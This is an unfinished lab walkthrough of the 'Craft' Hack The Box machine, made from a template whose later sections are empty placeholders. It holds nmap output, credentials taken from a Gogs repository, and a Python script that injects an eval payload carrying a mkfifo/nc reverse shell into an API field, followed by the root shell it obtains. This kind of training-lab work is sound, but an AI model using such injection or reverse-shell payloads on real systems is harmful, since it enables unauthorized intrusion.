
| Property         | Value                    |
| ---------------- | ------------------------ |
| **OS**           | Linux                    |
| **Difficulty**   | Medium                   |
| **Release Date** | YYYY-MM-DD               |
| **State**        | YYYY-MM-DD               |
| **IP**           | 10.10.10.X               |
| **Techniques**   | technique-1, technique-2 |
| **Tags**         | #web #privesc #linux     |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
sudo nmap -sC -sV craft.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-08 13:33 EDT
Nmap scan report for craft.htb (10.129.162.165)
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-title: About
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_http-server-header: nginx/1.15.8
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.33 seconds

```

```
sudo nmap -p- craft.htb --open 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-08 13:33 EDT
Nmap scan report for craft.htb (10.129.162.165)
Host is up (0.030s latency).
Not shown: 65414 closed tcp ports (reset), 118 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
6022/tcp open  x11

Nmap done: 1 IP address (1 host up) scanned in 16.51 seconds
                                                                  
```

```
nmap -p 6022 craft.htb -sV -sC        
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-08 13:33 EDT
Nmap scan report for craft.htb (10.129.162.165)
Host is up (0.030s latency).

PORT     STATE SERVICE VERSION
6022/tcp open  ssh     Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.54 seconds
                                                               
```

### web page Enumeration

clicking on api redirects to:

```
https://api.craft.htb/api/
```

adding to /etc/hosts:

```
echo '10.129.162.165 api.craft.htb' | sudo tee -a /etc/hosts
```

clicking on the icon redirects to:

```
https://gogs.craft.htb/
```

```
echo '10.129.162.165 gogs.craft.htb' | sudo tee -a /etc/hosts
```

navigating to issues discolse a chat and a token which appears to be unusable:

img

looking at the issues commit discloses a eval vulnerabiliry:

img

searching for test discloses a script for connecting to the api, and looking through the history files reveals the initial creds used:


the script is copied to kali and a payload is inserted into the abv parameter

```python
#!/usr/bin/env python

import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

# make sure token is valid
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)

# create a sample brew with bogus ABV... should fail.

print("Create bogus ABV brew")
brew_dict = {}
brew_dict['abv'] = '15.0'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)


# create a sample brew with real ABV... should succeed.
print("Create real ABV brew")
brew_dict = {}
brew_dict['abv'] = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.74 4444 >/tmp/f')"
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)                                                                                                                    
```

## Shell

```
nc -lvnp 4444            
listening on [any] 4444 ...
connect to [10.10.15.74] from (UNKNOWN) [10.129.163.136] 35495
/bin/sh: can't access tty; job control turned off
/opt/app # python3 -c 'import pty; pty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/usr/local/lib/python3.6/pty.py", line 156, in spawn
    os.execlp(argv[0], *argv)
  File "/usr/local/lib/python3.6/os.py", line 542, in execlp
    execvp(file, args)
  File "/usr/local/lib/python3.6/os.py", line 559, in execvp
    _execvpe(file, args)
  File "/usr/local/lib/python3.6/os.py", line 583, in _execvpe
    exec_func(file, *argrest)
FileNotFoundError: [Errno 2] No such file or directory
/opt/app # whoami
root
/opt/app # env
HOSTNAME=5a3d243127f5
PYTHON_PIP_VERSION=19.0.1
SHLVL=2
HOME=/root
GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
PYTHON_VERSION=3.6.8
PWD=/opt/app
/opt/app # ls -la
total 32
drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
-rw-r--r--    1 root     root            18 Feb  7  2019 .gitignore
-rw-r--r--    1 root     root          1585 Feb  7  2019 app.py
drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
-rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests

```

---
## Foothold

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

Step-by-step exploitation with commands.

```shell
# Commands used
```

---
## User Flag

### Lateral Movement (if applicable)

Steps to move from initial foothold to user access.

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)